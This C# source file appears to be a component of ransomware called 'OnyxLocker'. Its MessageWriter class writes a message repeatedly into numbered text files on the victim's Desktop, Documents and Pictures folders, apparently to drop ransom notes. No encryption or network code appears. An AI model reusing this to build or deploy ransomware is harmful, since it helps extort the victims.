using System;
using System.IO;

namespace OnyxLocker.Classes;

internal class MessageWriter
{
	private string Message { get; }

	private string FileName { get; }

	private int MessageCount { get; }

	public MessageWriter(string message, string fileName, int messageCount)
	{
		Message = message;
		FileName = fileName;
		MessageCount = messageCount;
	}

	public void WriteMessageToDesktop()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		WriteMessages(folderPath, Message, MessageCount, FileName);
	}

	public void WriteMessageToDocuments()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
		WriteMessages(folderPath, Message, MessageCount, FileName);
	}

	public void WriteMessageToPictures()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures);
		WriteMessages(folderPath, Message, MessageCount, FileName);
	}

	private void WriteMessages(string folderPath, string message, int messageCount, string fileName)
	{
		for (int i = 0; i < messageCount; i++)
		{
			string path = $"{fileName} {i} .txt";
			string path2 = Path.Combine(folderPath, path);
			FileStream stream;
			using (stream = new FileStream(path2, FileMode.OpenOrCreate))
			{
				StreamWriter streamWriter;
				using (streamWriter = new StreamWriter(stream))
				{
					streamWriter.WriteLine(message);
				}
			}
		}
	}
}
